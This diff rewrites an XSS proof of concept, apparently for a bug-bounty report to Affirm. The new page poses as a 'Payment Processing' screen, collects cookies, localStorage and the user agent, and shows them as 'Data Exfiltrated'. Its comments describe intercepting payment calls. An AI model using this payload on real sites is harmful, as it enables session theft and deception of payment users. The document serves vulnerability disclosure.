@@ -1,7 +1,36 @@
-<script>
-  // This proves JavaScript execution
-  alert("XSS via Deep Link");
-  
-  // This proves you can access the Document (cookie theft potential)
-  document.body.innerHTML = "<h1>Injecting HTML</h1><pre>" + document.cookie + "</pre>";
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Payment Processing...</title>
+    <!-- Mimic the styling of the real app to look legitimate -->
+    <style>body { font-family: sans-serif; text-align: center; padding: 20px; } .loader { ... } </style>
+</head>
+<body>
+    <h3>Finalizing your payment details...</h3>
+    <div id="status">Connecting to payment provider...</div>
+
+    <script>
+        // 1. PROVE XSS
+        alert("XSS Confirmed: JavaScript executing in Trusted Context");
+
+        // 2. PROVE DATA THEFT CAPABILITY
+        // In a real attack, we would hook the 'affirm' object if it exists
+        // or just steal cookies/localStorage that might contain session tokens.
+        
+        var stolenData = {
+            cookies: document.cookie,
+            localStorage: JSON.stringify(localStorage),
+            userAgent: navigator.userAgent
+        };
+
+        // Log it to the screen (Proof for Triager)
+        document.getElementById("status").innerHTML = 
+            "<h2 style='color:red'>Data Exfiltrated:</h2><pre>" + 
+            JSON.stringify(stolenData, null, 2) + "</pre>";
+
+        // 3. SHOW BUSINESS IMPACT
+        // Explain that if this was the real Affirm flow, we would intercept:
+        // affirm.analytics.trackOrderConfirmed(...)
+    </script>
+</body>
+</html>
